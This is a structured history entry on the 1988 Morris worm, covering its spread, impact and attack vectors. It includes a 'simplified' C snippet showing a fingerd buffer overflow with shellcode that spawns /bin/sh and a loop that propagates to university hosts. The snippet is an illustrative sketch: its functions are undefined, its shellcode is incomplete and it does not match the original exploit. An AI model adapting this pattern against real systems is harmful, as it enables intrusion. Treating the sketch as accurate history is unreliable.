# id
morris-worm-1988

# title
The Morris Worm - First Internet Catastrophe

# what
The first major computer worm to spread across the Internet, created by Robert Tappan Morris in 1988. This self-replicating program infected approximately 10% of all computers connected to the Internet at the time (around 6,000 machines), causing widespread disruption and leading to the first conviction under the Computer Fraud and Abuse Act.

# impact
Exposed critical security vulnerabilities in Unix systems, led to the creation of the first Computer Emergency Response Team (CERT), and fundamentally changed how we think about Internet security. Caused millions of dollars in damages and sparked the modern cybersecurity industry.

# when
1988

# category
Cyber Security

# language
C

# codeSnippet
```c
/* Simplified version of Morris Worm finger exploit */
#include <stdio.h>
#include <string.h>
#include <sys/socket.h>

/* Buffer overflow exploit targeting fingerd */
void exploit_finger() {
    char buffer[512];
    char shellcode[] = "\x90\x90\x90\x90"  /* NOP sled */
                      "\x31\xc0\x50\x68"   /* execve("/bin/sh") */
                      "\x2f\x2f\x73\x68"
                      "\x68\x2f\x62\x69\x6e";
    
    /* Overflow the buffer to overwrite return address */
    memset(buffer, 'A', 400);
    strcat(buffer, shellcode);
    
    /* Send malicious request to fingerd */
    send_finger_request(buffer);
}

/* Worm propagation logic */
void propagate() {
    char *targets[] = {
        "berkeley.edu", "mit.edu", "stanford.edu"
    };
    
    for (int i = 0; i < 3; i++) {
        if (connect_to_host(targets[i])) {
            exploit_finger();
        }
    }
}
```

# sourceLink
https://www.fbi.gov/news/stories/morris-worm-30-years-since-first-major-attack-on-internet-110218

# expertExplanation
The Morris Worm used multiple attack vectors including buffer overflow exploits in fingerd, sendmail, and rsh. It used a dictionary attack on passwords and exploited trust relationships between machines. The worm's aggressive replication caused system slowdowns as multiple copies infected the same machines, revealing the fragility of early Internet infrastructure.
